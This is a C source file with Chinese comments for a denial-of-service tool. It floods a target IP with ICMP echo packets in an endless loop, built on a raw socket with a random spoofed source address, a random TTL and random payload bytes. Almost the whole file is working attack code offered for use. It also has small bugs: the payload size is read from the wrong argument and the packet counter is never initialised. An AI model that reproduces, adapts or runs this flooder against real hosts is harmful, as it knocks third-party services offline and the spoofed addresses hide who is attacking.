#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/time.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <unistd.h>
typedef unsigned char u8; /* 自定义类型u8类型 */
typedef unsigned short int u16; /*  同上 */
unsigned short in_cksum(unsigned short *ptr, int nbytes); /* 声明函数原型 */
void help(const char *p); /* 同上 */
int main(int argc, char **argv)
{
	if (argc < 2)  /* 如果参数小于2个就退出 */
	{
		printf("usage: %s <destination IP> [payload size]\n", argv[0]);
		exit(0);
	}
/* 定义用于目的和源地直的变量 */
	unsigned long daddr;
	unsigned long saddr;
	int payload_size = 0, sent, sent_size;
	daddr = inet_addr(argv[1]); /*将一个点分十进制的IP转换成一个长整数型数*/
	if (argc > 2)
	{
		payload_size = atoi(argv[1]);
	}
	int sockfd = socket (AF_INET, SOCK_RAW, IPPROTO_RAW); /*创建socket描述符*/
	if (sockfd < 0) /*如果创建失败就退出*/
	{
		perror("could not create socket");
		return (0);
	}
	int on = 1;
/*设置与某个套接字关联的选项，如果失败则退出 */
	if (setsockopt (sockfd, IPPROTO_IP, IP_HDRINCL, (const char*)&on, sizeof (on)) == -1) 
	{
		perror("setsockopt");
		return (0);
	}
	if (setsockopt (sockfd, SOL_SOCKET, SO_BROADCAST, (const char*)&on, sizeof (on)) == -1) 
	{
		perror("setsockopt");
		return (0);
	}	
	int packet_size = sizeof (struct iphdr) + sizeof (struct icmphdr) + payload_size;
	char *packet = (char *) malloc (packet_size); /*申请用于数据存放*/
	if (!packet) /*如果申请内存失败则退出*/
	{
		perror("out of memory");
		close(sockfd);
		return (0);
	}
/* 定义ip数据结构和icmp数据包结构*/
	struct iphdr *ip = (struct iphdr *) packet;
	struct icmphdr *icmp = (struct icmphdr *) (packet + sizeof (struct iphdr));
	memset (packet, 0, packet_size); /*初始化数据包*/
/* 设置数据包选项值*/
	ip->version = 4;
	ip->ihl = 5;
	ip->tos = 0;
	ip->tot_len = htons (packet_size);
	ip->id = rand ();
	ip->frag_off = 0;
	//ip->ttl = 255;
	ip->protocol = IPPROTO_ICMP;
	ip->saddr = random();/*随机生成IP地址*/
	ip->daddr = daddr;
	icmp->type = ICMP_ECHO;
	icmp->code = 0;
	icmp->un.echo.sequence = rand();
	icmp->un.echo.id = rand();
	icmp->checksum = 0;
	struct sockaddr_in servaddr;
	servaddr.sin_family = AF_INET; /*使用 IPv4 进行通信*/
	servaddr.sin_addr.s_addr = daddr;
	memset(&servaddr.sin_zero, 0, sizeof (servaddr.sin_zero));
	puts("flooding...");
	while (1) /*间隔10000微秒，循环发送数据包*/
	{
		memset(packet + sizeof(struct iphdr) + sizeof(struct icmphdr), rand() % 255, payload_size);
		ip->saddr=random();  
ip->ttl = random();
		icmp->checksum = 0;
		icmp->checksum = in_cksum((unsigned short *)icmp, sizeof(struct icmphdr) + payload_size);
		if ( (sent_size = sendto(sockfd, packet, packet_size, 0, (struct sockaddr*) &servaddr, sizeof (servaddr))) < 1) 
		{
			perror("send failed\n");
			break;
		}
		++sent;
		printf("%d packets sent\r", sent);
		fflush(stdout);
		usleep(10000);	//microseconds
	}
	free(packet);  /*释放申请的内存*/
	close(sockfd);  /*关闭描述符*/
	return (0);
}
unsigned short in_cksum(unsigned short *ptr, int nbytes) /*检查数据*/
{
	register long sum;
	u_short oddbyte;
	register u_short answer;
	sum = 0;
	while (nbytes > 1) {
		sum += *ptr++;
		nbytes -= 2;
	}
	if (nbytes == 1) {
		oddbyte = 0;
		*((u_char *) & oddbyte) = *(u_char *) ptr;
		sum += oddbyte;
	}
	sum = (sum >> 16) + (sum & 0xffff);
	sum += (sum >> 16);
	answer = ~sum;
	return (answer);
}
